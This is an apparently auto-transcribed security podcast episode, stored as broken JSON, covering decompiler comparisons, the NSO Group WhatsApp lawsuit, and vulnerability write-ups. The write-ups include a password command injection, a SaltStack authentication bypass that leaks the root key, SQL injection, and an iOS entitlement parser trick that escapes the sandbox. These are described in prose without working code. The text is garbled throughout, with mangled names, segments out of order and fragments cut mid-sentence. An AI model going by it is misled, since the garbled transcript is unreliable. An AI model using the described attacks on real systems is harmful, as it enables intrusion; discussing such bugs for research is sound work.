sometimes they don't have any constant propagation. So while they allow you to use enumerated types, they don't really do anything and the the biggest gripe. I think that I had with it was with C++ stuff last member names work, but you can't use the standard Library when you define classes for your types though. The problem with that is if you have a class for something to reversing that has like a, you know standard lib string or Anything like that, like a vector a string anything like that. You're not going to be able to put that into realize at least I couldn't seem to get it in there.\", \"start\": 158.9}, {\"speaker\": 1, \"line\": \" Yeah, and that's definitely like an annoying part of it at the same time. Like I'm sure some of those structures are going to be quite complex for them to just kind of filled in\", \"start\": 272.2}, {\"speaker\": 2, \"line\": \" but at the same time standard lid is pretty\", \"start\": 285.3}, {\"speaker\": 1, \"line\": \" calm. Yeah. I know I completely agree like it's I've so I don't actually know. What like I'd s support is for that. Do you know offhand? I haven't done a ton of C++ re\", \"start\": 287.5}, {\"speaker\": 2, \"line\": \" yeah, I'm not into C++. Sorry. I actually hate it. So I haven't really tried it and I to either so that is a fair point. I don't know how hex raise handles that it might have the same issue or might not even like it might be even worse. I can't speak on that and I think when we did Benja we kind of neglected the C++ a little bit more. So to be fair to realize it could just be something that I noticed. On the realized stream, but I didn't really test much on some other decompilers. So there could be a bit of a bias there overall though. There were some positives with realize for sure for one. It had some really nice optimization on dead functions and it was so nice. Actually that I wanted to double-check that it wasn't overly aggressive which it wasn't in my tests. They have a really nice filter search panel, which I really liked you can do like a filter search and search all the columns and stuff like that. It's a little bit more. It's kind of like deidre's search actually, and I think the other thing is that handled stock checks Earth's like stack cookie checks really? Well. So sometimes like binary ninja would leave out stack cookie checks, which is submit them Deidre would sometimes just a bit them or would like mess up the analysis, but with realized they were like they're plain as day it even had a little bit of constant propagation with that as well. So yeah overall they had some positives Were a few negatives but like we were saying on the stream realizes one of those things where the decompiler at least for free just dropped and it's more mature than binary ninja C compiler like as in it's been around for longer but it's not as old as x-rays, you know what I mean? So I don't expect it to compete with x-rays yet. You know, I don't think it's at that level. So since we've kind of summarized realized there I will give some like our bit of a recap on some of the binges stuff. If and what it did better than realize which was and handled rewriting better for decompiling. It was more intuitive to use because the ux I think was was done better on Benja and there was constant propagation though. It was a little bit too aggressive. But yeah, I can't remember if it had the C++ class stuff like like realized it. I can't\", \"start\": 303.2}, {\"speaker\": 1, \"line\": \" sell. I don't believe we really tried with that. I think we played around with some vtable stuff and Some of that just see how the decompiler handled it but not so much at the structure level and just using using it so I can't speak offhand for that. I will say that one things you liked with the dead code elimination was basically when it would take a function that did nothing but returned a constant and basically just pop that in place and binge it does do the same thing.\", \"start\": 442.6}, {\"speaker\": 2, \"line\": \" Yeah, so I mean, I think I will go back this week and check out Benja and see if it does that class stuff. I'm not going to do a stream on it because it's just one thing. I want to check and then I'll probably do like a correction next stream or like, you know, addendum or whatever. But yeah, I think we're going to also write a more detailed blog post at some point that breaks the stuff down more and gives examples and stuff like that. I also haven't published that Corpus repository that I was working on. So I got a fix like clean that up a little bit and push. That out. So there we are going to be doing a blog post more structured blog post on it\", \"start\": 471.5}, {\"speaker\": 1, \"line\": \" soon. Yeah, probably targeting closer to after Benja stable has the decompiler.\", \"start\": 506.2}, {\"speaker\": 2, \"line\": \" Yeah, it's which\", \"start\": 514.9}, {\"speaker\": 1, \"line\": \" is I think kind of coming towards the end of the month or so\", \"start\": 515.9}, {\"speaker\": 2, \"line\": \" IE, I think end of May was when they were aiming for so yeah, so we'll do that more structured blog post to take a look out for that. But if you want to, you know, see some of our thoughts and insights on it before that blog post goes out the twitch mods will be up for a little while. I think usually they stop stay up for at least 30 days. So the binge of one is a little bit older but the realized one will be up for a while so you can check those out while they're still up and I think I will Like a stream cut on the YouTube channel for anybody who wants some of the highlights from that basically, but with that said well, we'll move on to some news. We actually only have one news topic poor we jump in and some exploits this week and it's kind of a follow-up to soar as we talked about before with the NSO group and Facebook. So there's a lawsuit going on Facebook is suing me Anna so group I think over there WhatsApp stuff they're claiming but NSO group basically breached WhatsApp Ooh the through vulnerability that they're well by where you sit there are a\", \"start\": 520.6}, {\"speaker\": 1, \"line\": \" few different things that kind of go into that. I believe it actually comes up with there's two because you have to remember breaching that's criminal. That's not something that you're going to be sued in Civil Court over that's like cfaa started Computer Fraud and Abuse Act. Oh whereas this is more if their Civil Court, I believe it does mention. Kind of the specifics of where what they were suing over. That's it. I only really want to talk about a couple. A couple of things that kind of come up out of this or come up out of NSO groups most recent filing. I'll know what you had to mention by one of the things was this comment on immunity. We're NSO group is basically arguing that because their customers are government. They're effectively immune to any sort of litigation. Now it mentions here, you know, the whether or not sovereign immunity applies to them. I think that might actually like I think they might be being to refer to State immunity which applies to kind of foreign governments that said, I'm not a\", \"start\": 579.7}, {\"speaker\": 2, \"line\": \" lawyer you're not a lawyer. So,\", \"start\": 659.2}, {\"speaker\": 1, \"line\": \" you know, this is purely just us\", \"start\": 661.6}, {\"speaker\": 2, \"line\": \" talking about it.\", \"start\": 663.9}, {\"speaker\": 1, \"line\": \" No, no real understanding of all the legal stuff, but I did find that kind of an interesting idea that as a company if they're selling to a government there somehow possibly immune\", \"start\": 665.3}, {\"speaker\": 2, \"line\": \" that seems weird to me like why?\", \"start\": 678.0}, {\"speaker\": 1, \"line\": \" Yeah, I know. I think I never\", \"start\": 680.4}, {\"speaker\": 2, \"line\": \" meant sin Force the law doesn't mean they're above it and turns like well, so at\", \"start\": 681.7}, {\"speaker\": 1, \"line\": \" least with sovereign immunity though is pretty much exactly that the governor because all criminal charges. Our because you can sell you can sue the government. I believe I'm actually not completely certain about that. I know you can see what I believe. You can see two parts of the government such as like the doj when somebody's been imprisoned and then probably yeah like that falsely imprison that said I'm not sure about the actual government. But when you go into criminal court, it's always, you know, and the u.s. It's the u.s. Versus whoever's been. With something so taking you know, the u.s. To Criminal Court is you know, the u.s. Versus the US so many you caught you can kind of understand where some of me when he comes in like you might be able to apply to some specific individuals but not to the government itself. So at least that's some idea of the immunity and then like I mentioned the state immunity is just basically kind of a truce between countries that you're not going to start suing each other or charging each other. kind of at that level which I mean a country doesn't really have the ability to enforce anything against the other country. Anyhow. Yes, so I mean nobody sends does make some sense. It's just you know one is NSO group because they're you know, you can look them as kind of being NSR government contractors. They also mentioned that you know, they don't run the Pegasus software for their clients. So Any of the actions involved wouldn't have been from\", \"start\": 686.8}, {\"speaker\": 2, \"line\": \" them. Yeah, I think that's like their big argument. Right as they're arguing that you know, they the cfaa they're arguing only applies to unauthorized access not\", \"start\": 795.0}, {\"speaker\": 1, \"line\": \" so that's that's actually separate argument. So there's two things going on here. There's the immunity claim they're claiming that their immune and\", \"start\": 807.0}, {\"speaker\": 2, \"line\": \" then the other one is the one I was just saying with\", \"start\": 816.1}, {\"speaker\": 1, \"line\": \" yes. Yeah. It's just it's separate, you know. Them not running Pegasus doesn't really matter with that. But yeah, as you are saying well the comments in here is an A so group and sis, it cannot have violated America's Computer Fraud and Abuse Act because it had authorization to send messages via WhatsApp. And this is kind of warmth comes I thought was most interesting. First of all, it is always worth mentioning when it comes to the law. There is a judge. Usually that's actually interpreting. The law or you know a jury you don't get to just play around on Al off the really minor technicalities when something is written in a way that makes it somewhat obvious. He's Deuce. There are still technicalities, of course that lawyers can play around with but and I do think this one might actually be one of those cases. It's an interesting point being that they were authorized to send messages because no compromise at least that was brought up initially. Involved what's app servers besides just WhatsApp facilitating the compromise it was compromising. Somebody's phone ignoring the fact that NFL claim that they don't run the software. It would have been somebody else actually doing that. You know the idea being they're allowed to send messages, you know, what's up terms of service doesn't prevent them from sending malicious messages.\", \"start\": 818.0}, {\"speaker\": 2, \"line\": \" Yeah, they basically you all they did was send to the wrong kind of messages over. What's up servers? Yeah. Um, so I mean it's an interesting argument. Like you said it is, you know, it is getting like pretty into the technicality weeds. But like what's interesting, especially when you're talking about like the legal system in court.\", \"start\": 911.4}, {\"speaker\": 1, \"line\": \" You're talking\", \"start\": 930.9}, {\"speaker\": 2, \"line\": \" about technology is most judges there probably are certain judges that are you know, kind of cut out for technical stuff. But for the most part judges aren't really going to appreciate those technicality, like technical differences differences just because they're not overly familiar with like the exploitation area, you know, it's kind of one of those areas where you have to be familiar with it to be able to understand all the intricacies of what's going on. Yeah. It's not like an everyday thing that you know a judge or a jury wouldn't counter in their everyday life. No, but that pretty Niche that's the point of expert witnesses to\", \"start\": 931.3}, {\"speaker\": 1, \"line\": \" explain that to the judge to explain that to the jury so that they are able to understand what they need to about it. I want expect the judge to understand it. I would expect a judge or jury to listen to an expert witness who explain some of those details to them. I wouldn't think that the law can't be upheld because a judge doesn't know that like a they don't need to know. Are they don't need to already go in there with that information? They just need to be able to listen to? Presumably an expert acting in good faith.\", \"start\": 965.5}, {\"speaker\": 2, \"line\": \" So I mean like you said like neither of us are really lawyers. I don't think we can speak to the you know effective how effective these arguments are or anything like that. But the reason we wanted to bring it up was like this is this is probably going to be a Bedrock case for future Computer Fraud and Abuse acts because you know, the way the legal system is from what I understand is a lot of cases are built on top of other cases. It's kind of like a brick wall and each case\", \"start\": 1002.0}, {\"speaker\": 1, \"line\": \" precedent close. Yeah.\", \"start\": 1026.2}, {\"speaker\": 2, \"line\": \" Yeah, you gonna putting a brick in that wall and everything after Kind of, you know will reference that case and I think this is going to be one of those Bedrock cases. That's that's going to be used in future lawsuits.\", \"start\": 1027.8}, {\"speaker\": 1, \"line\": \" Yeah, and that's kind of just in the US the legal system is very precedent based where if there's kind of the past presidents for doing something a judge and needs a reason to deviate from the decision of another core. Well now Tiffany equal court, but as I'm sure whatever happens it's going to get a peeled either way. It says as it moves its way up the court sky has that the precedent get set.

So this was posted on SSD disclosure though. It was reported through them, but the vendor rejected and ignored the reports apparently to this day. So I don't know what's going on there. Like it's just weird that they're just rejecting it. So they decided to do a full disclosure which is kind of interesting will probably get to that later on after we cover the issue. Actually, it seems the issue is that they have a vulnerable endpoint which takes a log in a password and a timeout and then it checks the referer header against an array of like different valid endpoints. And if the refers in that array, it executes command using the login and password variables and the password variables seems to just get concatenated into a string passed to the python interpreter for doing crypto.\", \"start\": 1089.1}, {\"speaker\": 1, \"line\": \" Well injected into the string and pull up the code here. Yeah. It's kind of in the middle there. It's the dollar sign too. Because it gets it gets sent like they do escape the password.

And in that service that sh file though, it takes the second argument the password passes it into python Crypt to try and generate like the proper hash for it.

I found weird. I don't know if you can answer this see because I Tried reading through the right up to see if I missed something and I couldn't really find it. If you look at the code snippet slightly above where you are. Now, it's it has the password variable set by it does escape shell are around the past password.

I'm guessing it like it's just not sufficient enough to prevent the\", \"start\": 1210.5}, {\"speaker\": 1, \"line\": \" no it's efficient. It prevents it prevents command. Ejection prevents you from escaping. But like I said, it's the actual injection happens in service thought sh it doesn't happen where PHP is calling service that sh Okay. So so this Escape set as it's being passed into service that sh so like the command injection. So there's going to be like a, you know, she'll execute or something like that with this whole command not sure if they show yeah, I don't think they show what that line looks like but there's going to be a shell like skill\", \"start\": 1237.2}, {\"speaker\": 2, \"line\": \" with yeah, they leave some lines out which is why I think I got a little bit confused.\", \"start\": 1275.4}, {\"speaker\": 1, \"line\": \" Yeah, which is fair.

So it's not a super like technical issue but getting back into like the disclosure stuff. It seems there was a Reddit post from the person who was actually behind the disclosure and they said they tried for three weeks to get a response over email. I think they tried to different emails. They tried support and sales, I think They tried reaching out through Twitter and they got like basically it seems radio silence for like 3 weeks. It was just like they just decided to disclose it. Which do you think that's fair zi. Do you think they should have waited a little bit longer three weeks does seem a little bit short when you're talking about trying to disclose issues because sometimes vendors do take a little bit longer than that even well-known ones though.

I don't think is fair three weeks is short but three weeks of absolutely no feedback. It's probably your probably not hearing anything back. If you wait further weeks.

They kind of a lot of people adhere to that as like a reasonable amount of time\", \"start\": 1501.0}, {\"speaker\": 1, \"line\": \" but a lot of places do 30 days though, 30 days was fairly common and still is pretty common as a 60,\", \"start\": 1507.6}, {\"speaker\": 2, \"line\": \" okay, but even if we stick To like 90 days that is usually assuming you've received a response and there were saying they're working on a fix and then if 90 days after the first report, it's not fixed. Then you disclose it here. You're not getting a response at all. So I think I think it's more reasonable to not wait a full 90 days. So yeah, I'm kind of an agreement. I think three weeks is a reasonable amount of time to expect some kind of response. So I was just kind of curious if you would have like a different point of view on on that. Did you want to add anything on there? I know I kind of cut you off earlier. So yeah, I think we'll move on to saltstack. So this is this is kind of one of our one of our more headlining topics. So this was published by f-secure labs and it details to vulnerabilities in saltstack. It's an authentication bypass and a directory traversal which we have a lot of in this episode. So salt stack is a digital infrastructure management product and it you know, it actually seems to Target security funnily enough and the The issue is there's a class called clear fungus which exposes these two methods sent Pub send Pub and prep off the info and it seems these methods are exposed to unauthenticated\", \"start\": 1514.4}, {\"speaker\": 1, \"line\": \" requests. Yeah, so I just pulled up actually some of the code this is I believe I should have taken note. I believe this is a commit before they fix the issue that I've just kind of hold up in the basic idea here with clear funks is well, actually with this whole area of cone General is your able to send in your commands and it essentially because they also do this with just their a es encrypted commands and clear funks in particular the commands accessible without identification that are available in the clear. in the way they do this is Basically, you come in the you send the payload properly. It parses it. However that lock side and look into how it receives it. I just looked at how process these commands and it basically just ends up calling the function on itself notice this line\", \"start\": 1592.9}, {\"speaker\": 2, \"line\": \" 1154.\", \"start\": 1650.5}, {\"speaker\": 1, \"line\": \" We're just kind of grabs the sorry grabs the attribute of whatever the command is and calls it as a function.

Which\", \"start\": 1724.9}, {\"speaker\": 1, \"line\": \" is then the problem because they have a specter which just mentioned. There are the two commands the prep off fo and send pop both of those are single underscores before them. Which means somebody even though it's not necessarily documented can simply call either of those functions and use them. So I'll mention prep off info in particular basically just Returns the Ruki that's used to authenticate the commands so you can remotely call admin commands on like the master server using that key adjust returns that to you to use for whatever Joyce purpose you have. Send Pub on the other hand is basically to send messages out to. At their back to them. Well, I'm going to assume things go through the master regardless, but effectively it does the same thing. It results in code execution. Usually like it'll use send Pub an ill kind of craft the message in one of those functions else and then I'll just send it off there. But by calling it directly you can craft any sort of administrative message you want. What's kind of interesting here is this was used by lineage OS. I don't know. Did you have anything more to add about the vulnerability itself\", \"start\": 1728.5}, {\"speaker\": 2, \"line\": \" specter? I know you've covered it pretty well there but I was actually going to say exactly what you're jumping into now is we've actually seen that this is being abused against like projects in the wild right now and you were saying like a lineage OS.\", \"start\": 1810.8}, {\"speaker\": 1, \"line\": \" Yeah.

And then they had this further update now where they've updated they fixed and all that. Anyway. So lineage OS they use salt stack and on May 2nd, so just couple days ago an attacker used presume.

So obviously I don't want to you know, sit back and just you know victim blame essentially saying, oh, well, you know the companies always at fault or shouldn't be at fault or you know, that fact that I mean, it's still an illegal action.

But I mean, I feel like it's not necessarily being presented in good faith or without an ulterior motive I guess. But what I was just going to get at is in terms of I think like saltstack handle what they put out the discussed like notification pretty quickly. They put out a notification on GitHub with a PDF with a link that you couldn't actually click the link on which was really annoying. It's like, you know for more information. Here's the URL and you can actually click the URL. It was like they had a Word document or like a I don't know. I don't know what they will have had and then like printed it. Like maybe even had a PDF and then printed the PDF to PDF again. So it kind of flattened it. Hmm. Oh, so that was a little bit annoying on their side by apparently, they did emails and all that. So the fact that they're GitHub message wasn't perfect. I'm not really blaming them for but they put out the alert of really early pretty much as soon as they could. And then got a patch out as soon as they could after that. It's basically giving people the immediate. Do you know what to do and then try to fix it later? So lineage OS I should have responded to\", \"start\": 2200.8}, {\"speaker\": 2, \"line\": \" that. Yeah, I think that's fair. I will say there is a second issue that I'm going to jump back to and it was in the get token method which you can access from the same class. This one is like a more trivial issue. It basically takes a file name, but it doesn't validate against directory traversal. So you can just read files outside of the directory. Now that file does have to be able to deserialize with their salt that payload on cereal that loads method. So there is a kind of a condition attached to abusing that one, but I just wanted to mention that there was that other Issued attached to it now because of the impact even though these laws have been abuse as we just saw with lineage OS they didn't provide any pocs or anything like that. They wanted to kind of make it. So it's harder to exploit by Script kiddies and stuff like that. No, I'm jumping into the timeline. Sorry.

And actually I do want to jump back just speaking about the commit and the diff where they fix that. I'm not going to bother bringing it up on train, but I will mention that with the code. I showed earlier it was basically whatever command came in if it was a function on the class and it didn't start with the two underscores. It would try and execute that function.

I've got it listed as 1 so that explains convert different numbers, but unauthenticated second-order SQL injection. the SQL injection itself isn't terribly interests they have the code for this one basically they've got first SQL string here and then the results of that which is effectively what what courses you're in your that's the gist of it the results of that the columns from there are just imploded into the next query as is so if you could control with one of those values is our what the value contains then you can do a sequel injection because it doesn't do so into prepared\", \"start\": 2898.9}, {\"speaker\": 2, \"line\": \" manner Which is funny because the first one is done a prepared manner, but the second one isn't that's kind of weird that like generally when you use well statements you try to use them\", \"start\": 2966.8}, {\"speaker\": 1, \"line\": \" everywhere.

Copying files when issues are moved from one project to another but the file name isn't validated and restricted. So if you create an issue with a link to a file name and move the issue, you can specify any file and that link and have the file copied to the second project.

They do some reprocessing on the image.

It's kind of like, you know that POC or Get out, you know what I mean POC or GTFO. So this kind of turned it into more of a challenge like we have this common theme, I think over the entire episode where we have like trivial issues that take work to exploit because of just weird circumstances and just this is another one of those and this post goes through some of the techniques.

algorithm which is used because like split the streams and the tea reader read Handler can be used from inside the result of promise and it's supposed to be run asynchronously since it's being run as kind of the result of the promised its they have to do some extra work figure out how to synchronously trigger the read Handler but the gist of it is that inside of the TL gorilla make uses its own set of flags so it doesn't actually update the readable State until after that Loop is ended allowing you to make the buffer smaller when you shouldn't be able to basically and they don't go into

it's almost always exploitable like I don't think like this is almost certainly could be used for code execution even though obviously the reproduction case doesn't do that though if you to challenge this is probably quite challenging and I would say get it get some experience with browser exploitation before tackling this one but you know if you are experienced with browser exploitation and kind

And as imply the bug does seem to be pretty straightforward and it's basically in how entitlements are parse for I us so on Modern systems for sandboxing you'll have privilege boundaries right you're going to have the very common restriction based on uid you can't access resources of another uid or you need root or uid 0 to perform certain actions but iOS and Mac OS also use something called entitlements which are basically embedded into the app signature and these basically specify what an app can and can't do it's like a white list for what subsystems the app has access\", \"start\": 6800.8}, {\"speaker\": 1, \"line\": \" to yeah and I will say that this this also I believe it gets signed by Apple it does yeah so that's another challenge here like you can't just add\", \"start\":

security don't know container generally speaking I'm going to assume you can just ask for that normally I don't actually know if you can you\", \"start\": 6850.5}, {\"speaker\": 2, \"line\": \" boss of the enrollments are signed by Apple like you're saying so that you know apps don't try to give themselves over reaching entitlements but that's only true in the case of like when it's sent to the App Store you can have developers certificates where the signature is actually managed by the developer and the signatures or the entitlement itself isn't actually signed but the provisioning profile is signed so basically there's a bit of a discrepancy there so that's going to the App Store you can't control that entitlement but with the development the Purser you can control the entitlement but it's restricted by the provisioning profile so it's a little bit weird there and basically the provisioning profile tries to whitelist one entitlements are okay for the developer certs to have but the problem is is the provisioning profile uses a different parser for parsing XML than the actual entitlement parsing does so Apple supports these things called P lists and XML or property lists and these basically allow you to use various different containers like dictionaries values stuff like that and what super weird is iOS has four different plist parsers and in the case of valid XML they all return the same thing but in the case of in valid XML there's discrepancies between the data that they return so as you can see in the POC if you're watching the stream he uses these tokens which are not valid token C uses like left angle bracket exclamation mark - - - right angle bracket and that's typically a comment but there's no actual comment in there it's just one you know well I started there's actually Merchant one\", \"start\": 6865.4}, {\"speaker\": 1, \"line\": \" it's not quite even a valid comment which is kind of what I found interest here so I suspect was just mentioning its angle bracket the opening curly bracket exclamation point three dashes closing angle brackets interesting with that is when you do the open comment it needs two of those dashes and then when do the clothes it's two dashes so there's that overlap of that one character the middle that's part of both the open and the close and I believe that's where the parser differential comes in here between their three Parcels that they\", \"start\": 6968.4}, {\"speaker\": 2, \"line\": \" use because\", \"start\": 7003.3}, {\"speaker\": 1, \"line\": \" you can kind of imagine if somebody were to write the code say looking for the first index of you know as their parsing through look for the first index of that angle bracket exclamation - - so the open comment they get the start of that and then from that star position they look for the next occurrence of just the - - like the closing comment and you can kind of understand if they don't increment it so doesn't include the dashes from the open if they don't start looking after that open tag if they actually include those then you can kind of understand where this parser differential comes from where the 1 parser see is that as also ending the comment whereas the others don't which is kind of the issue that happens here they do that and then they do another one that just has the open take no overlap like just two dashes in it that way it'll see a close one also on the other systems but not in the eye okay that they'll like you keep going\", \"start\": 7005.8}, {\"speaker\": 2, \"line\": \" yeah so essentially like the validator uses the core Foundation property list parser and then the actual use of the entitlement uses the I/O kit 1 so the core Foundation considers the exclamation point three dashes as the start and end comment where I/O kit just considers it the start of a comment so by using this you can basically make it so I owe kitces parts of the data that core Foundation can't see so you can kind of sneak entitlements past the it's verifying which is called the Apple mobile file Integrity AMF ID so there's a really nice little snippet that shows exactly what's going on here and I'm just going to bring it up on the screen so you can see they have a code snippet CFCs these bits ioq it sees these bits so you can see that the first bit you know our the second bit is basically not seen by the validator so it doesn't know that that entitlement is there and you can basically pass arbitrary entitlements to yourself and using that you have a Sandbox Escape oh and it's worth noting that these entitlements there's over like a thousand of them in apple and iOS and Mac OS there is actually like a list that somebody has been compiling that you could take a look at if you're curious but there's like so many entitlements that what you can do here is almost endless in a way just because there's so many different entitlements though it's very difficult to manage which is why I like you know especially when you're using different plist parsers it's just kind of impossible not to have issues here I do find it interesting why they use so many different ones why not just use one it's kind of

seguso was just playing around with app Dev trying to you know see what he could do with xcode and stuff and just kind of stumbled on the issue by accident and I wonder if that's kind of what tipped Apple off to fix it now it's you know you're always kind of had that thought process in your head like especially when it's such a subtle design issue what prompted it you know obviously we can't know

technical level but like a use after free or anything like that there's not really any like noise or instability this is just a it's a very simple parsing discrepancy bug which if you hit it right will have a 100% success rate it's a very clean bug which is extremely rare in iOS so this was kind of like a you know like a gold a gold nugget kind of in the in the Iowa seen so it definitely blew

reddits p.m. me or shellcode I just like getting shellcode and I like taking a look at so it's always been having mine but I know other people that yeah at least take a cursory look at the Shell Code to see what it's doing oh and I feel like this code says said it's it's effectively simulate is a honey pot in a proof of concept in a piece of proof of concept code so he put it out there are actually several copies of it for several different CVS as though you can run this script you know give it the arguments and it'll compromise whatever Target you give it obviously using whatever the seavey's about what it actually does is it connects to his own server and all the commands you run just hit his own server give you some fake response back and that's that so it's a honey pot but it's at the exploit level the Cody use though I will say just put it up on stream it's really obvious that something suspicious is going on here because you'll notice that the end socket dot socket and does nothing with the socket except try and create a creates a raw socket does it so like it never even uses the local IP or the port but it does do an exact Shell Code which is you know python execute and side a python so like it's office skated it's using hex so for those of you just listening effectively all the script does is like prints nth and I just noticed this is python 2 because that's you know print without wrapping brackets but um print sending payload that it has like shellcode with a bunch of hacks like kind of looks like shellcode the lines are a little bit long in my opinion along Shell Code would be shorter lines but she'll go and just depending packs to it and then in theory you would then send that out so like if I was looking at this and like I said I do generally because it is a concern I would mostly just be looking for you know just a straight-up call to like system or like a p open or something like clear command injection I might not immediately get that the shellcode was that but that exact they're like eight super suspicious like I think he could have done a better job at making it look okay like even if somewhere in there he is like the target pour Faire like the target IP and stuff Santa's little things but that said even though I'm saying that he had like twenty five hundred runs effect so even though I'm saying like I definitely

game and like game form for us 64 that he can play all mine yeah now that term remote is what makes it so interesting because apparently that cartridge was the only game to include a built-in modem and the cartridge for online play which is like that's pretty cool I didn't know there were any N64 games that did something like that it's like really novel and Innovative and another thing was interesting is because this Hardware was so unique to that game and six for emulators don't support it because it's not really common it's only that one game that doesn't so all the testing that he had to do for hitting this bug had to be done on a real Nintendo 64 so in the post he kind of goes through the reversing that he had to do to try to pull feedback from the console and he found that the game had debugging statements left in it and stuff like that so it goes through the whole process of what he did to debug that exploit and how we found the actual issue which is a stack Overflow

Welcome to another episode of the day Zero podcast. I'm Specter with me is zi. So we're just going to jump right into some news. So we have something if you are one of those to cover first and it's something we actually missed a few weeks ago on April 17th realized desktop 3 was released and the big thing that dropped with that was that they actually change the licensing though that the non-commercial use license or the personal license were realized was made free where it wasn't before so we now have Another decompiler out there, that's not $10,000. So that is a pretty big point that we ended up missing especially because we covered Benja last week and we didn't really cover realize much and that's just something we missed somehow. So we definitely wanted to remedy that and\", \"start\": 9.1}, {\"speaker\": 1, \"line\": \" yeah, I think we kind of missed it. I don't know about you. I saw people talking about realized a little bit like saw some chatter, but I'd remembered realized as like I said, I think we've mentioned we have mentioned it before I think we've looked at it not On stream before but just in general and well didn't like it didn't as far as I know didn't have a decompiler that point either either. Yeah, I don't think it did. So when I saw it, I didn't even know they are planning a decompiler. So I saw people talk about the updates like okay, it's just another update and we don't generally tend to just cover, you know, just standard updates. So I didn't even really look into it. So it was until somebody pointed out know there's a decompiler with it that We actually started looking at it and I think talking before stream. You mentioned that you don't really take too much of a look. At the decompiler yet or have you\", \"start\": 54.1}, {\"speaker\": 2, \"line\": \" I haven't really looked at realize I am going to be doing a strain that's going to be looking at it probably tomorrow, but some at some point throughout this week. I'm not setting tomorrow like Hart and stone, but I would like to really like do kind of like what we did with Benja on a stream do that with realize. You know, I think for those of you who is there to shake so for\", \"start\": 109.0}, {\"speaker\": 1, \"line\": \" those of you who didn't catch that also we did do a like for our stream looking at the binge of decompiler. We had want the Ciphertext come in answered some questions. Tell us a little bit about the future like there's a lot of good information in that stream.\", \"start\": 129.6}, {\"speaker\": 2, \"line\": \" Yeah. I think he joined it about 90 minutes in for anybody wants a timestamp for that.\", \"start\": 143.6}, {\"speaker\": 1, \"line\": \" But yeah, so coming on to realize I did take a look at some things mostly things that we noticed Benja did or didn't do so the obvious one was with Binger. We noticed that a lot of are not a lot of but I'll in that bad characters from Rob Emporium. I wasn't doing that. Initialization so I know it's real eyes does have that in there it gets that cracked unsigned local characters gets the type right there. I did find a little bit weird that this fourth line a created it as an array sized one. And yeah did the office like I don't quite get why did it for that one like that?\", \"start\": 149.3}, {\"speaker\": 2, \"line\": \" But many others.\", \"start\": 188.6}, {\"speaker\": 1, \"line\": \" Yeah. And I mean, obviously you tell it the type you tell it's an array it rewrites everything just fine. A few other things I noticed in general. It didn't do for Loops. It would always prefer to Sting the while loop and just having the anti. Yeah similar to what Ghidorah would do which I mean the for Loop is what it was written as prop. Well actually, okay. So in another example that I decompiled, oh is definitely for loop, I would assume this is a for loop from Rob important given what it's doing but I don't technically know that the other thing I noticed here is On line 27 you have the access by index like the array type access but then when its accessing the other array, it just did a pointer calculation added the aqua technically it added the pointer to the offset. So it did that actually most of the time it did intend to create that array index. I just this is another one of those cases where I don't see why saw this one is an array and then wouldn't treat the other one as an\", \"start\": 189.9}, {\"speaker\": 2, \"line\": \" array. Yeah, there must be a very subtle discrepancy in the instructions that like it just\", \"start\": 259.6}, {\"speaker\": 1, \"line\": \" interpreted. Well, I tried looking at that and I couldn't nothing really stood out to me as to why I would do that and you know been Joe would treat this just as the pointer arithmetic it wouldn't even do the array index. So technically I mean realize doing a little bit better on that. So those are kind of a couple things. I know she's just looking at this bad characters loop again. We just need to find the other screenshot I have. I want the other things here. So this was I would have just like a little dummy program that I wrote and we had mentioned on ninja kind of the Annoying size conversions in line 12 on this rotates ring. You see like the cast unsigned and cash\", \"start\": 266.0}, {\"speaker\": 2, \"line\": \" character pointer\", \"start\": 313.7}, {\"speaker\": 1, \"line\": \" and owned. It still seemed a little bit excessive in this case to not as bad or at least definitely a lot more readable than binary ninjas was but still a little bit excessive compared to what probably could be done. Unfortunately. I didn't have G drill went to do comparisons back and forth on this one. I just kind of took what I remembered from Benja. And just apply that on to looking at the realize one here. It did create this variable size and that that's in the in the assembly itself course it it pulls that out as kind of its own little own little thinks. That's fair. Gives a you know, kind of that nice readable name so I gained kind of a fair move there. Once\", \"start\": 316.8}, {\"speaker\": 2, \"line\": \" I will say in general like the samples you've been pulling up. I do find the syntax to be a little bit more readable than binges and I think that might be because it's closer to C code. Yeah, and that's like I kind of prefer that style. You know what I mean? I like it.\", \"start\": 366.2}, {\"speaker\": 1, \"line\": \" I high-level my speaking of compilable. Here's my grape can copy and paste code. I could not find any way to extract this piece. That's why these are all screenshots with Bender. I copied the code. I will put it into my editor. So I had like it's highlighting. Yes, as far as I can tell and I'm sure somebody's going to correct me on this and I hope somebody does but I could not find a way to copy just a line of code out or the whole thing. I could have like save as Oh,\", \"start\": 382.1}, {\"speaker\": 2, \"line\": \" that's like a glaring missing\", \"start\": 418.5}, {\"speaker\": 1, \"line\": \" functionality. It does like nothing. I tried. So on Binger a few if you happen to click on what the key words, it would kind of highlight the line and then sub highlight the key word that he clicked on. If you tried to copy it would just copy the keyword with realized so sorry back on binges. But if you happen to just click the line make sure there are no other highlights are did copy like it would copy the whole line you can drag through. And copy everything with this you could copy keywords out, but you couldn't like drag over to copy multiple keywords. You couldn't just select the whole line. It would copy nothing in that case. So that's actually kind of an issue here. But I do feel like that's more of an oversight or like a bug not an intended feature. Although on that note. I will say and this is something I felt when I first he's realized like it's a really polished UI but I dislike it. I just I wouldn't want to use it. I don't like its UI. But it is fairly polished. I'm not sure exactly what it is. It just it's not it's not my workflow and he can change it kind of how I would normally work. I guess just how would she know some of the tabs? There are some customizations. It's just, you know, definitely kind of a personal preference thing to say. I don't really like it but that is a very personal thing. Like I'm not going to say nobody should use this because I don't like it. I mean obviously they've created something somebody's using yet somebody's paying for it. It's Y'all just personally I didn't really like the UI but it is very polished like it's a nice Cy. but\", \"start\": 419.7}, {\"speaker\": 2, \"line\": \" we got something I'll ask for when you were investigating. Do they have an API for scripting and stuff like that?\", \"start\": 525.7}, {\"speaker\": 1, \"line\": \" You know, I did not look into it. Like I was purely just looking at what? The decompiler was doing okay because last\", \"start\": 534.3}, {\"speaker\": 2, \"line\": \" time I remember with realized they didn't have scripting support and that is something that is a something that a lot of people like for reversing. Right? They'll write their own plugins to\", \"start\": 543.7}, {\"speaker\": 1, \"line\": \" looks like they do or they have some plugins. At least now, I just pulled it up on Google\", \"start\": 554.2}, {\"speaker\": 2, \"line\": \" here that could be interesting to look at to because that is like that is one thing binary Ninja really has going for it is it's a pi. So I'd want to see how that kind of Compares with realize that\", \"start\": 559.6}, {\"speaker\": 1, \"line\": \" That's\", \"start\": 570.3}, {\"speaker\": 2, \"line\": \" fair on thing to check out one thing. I do notice just with your screen shot though. This is like a minor gripe, you know, it's nothing big at if you know the data types, you can probably follow along but what I found interesting is with the parameters it'll 